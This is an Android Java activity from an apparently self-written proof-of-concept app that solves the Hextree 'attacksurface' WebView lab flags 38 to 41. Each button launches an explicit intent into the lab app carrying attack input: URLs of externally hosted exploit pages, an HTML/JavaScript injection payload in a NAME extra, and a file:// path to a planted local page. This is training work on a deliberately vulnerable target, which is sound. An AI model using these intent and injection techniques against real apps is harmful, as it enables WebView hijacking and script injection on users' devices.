package com.bedo.poc_app;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class Webview_Labs extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_webview_labs);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

    }

    public void Flag38(View view) {
        Intent intent = new Intent().setClassName("io.hextree.attacksurface","io.hextree.attacksurface.webviews.Flag38WebViewsActivity");
        intent.putExtra("URL","https://indigo-courtney-14.tiiny.site");
        startActivity(intent);
    }

    public void Flag39(View view) {
        Intent intent = new Intent().setClassName("io.hextree.attacksurface","io.hextree.attacksurface.webviews.Flag39WebViewsActivity");
        intent.putExtra("NAME","<img src=x onerror=alert(hextree.success())>");
        startActivity(intent);
    }

    public void Flag40(View view) {
        Intent intent = new Intent().setClassName("io.hextree.attacksurface","io.hextree.attacksurface.webviews.Flag40WebViewsActivity");
        intent.putExtra("URL","file:///data/local/tmp/flag40.html");
        startActivity(intent);
    }

    public void Flag41(View view) {
        Intent intent = new Intent().setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag41Activity");
        intent.putExtra("URL","https://peach-madelon-14.tiiny.site");// Exploit include with files and upload in your host
        startActivity(intent);
    }
}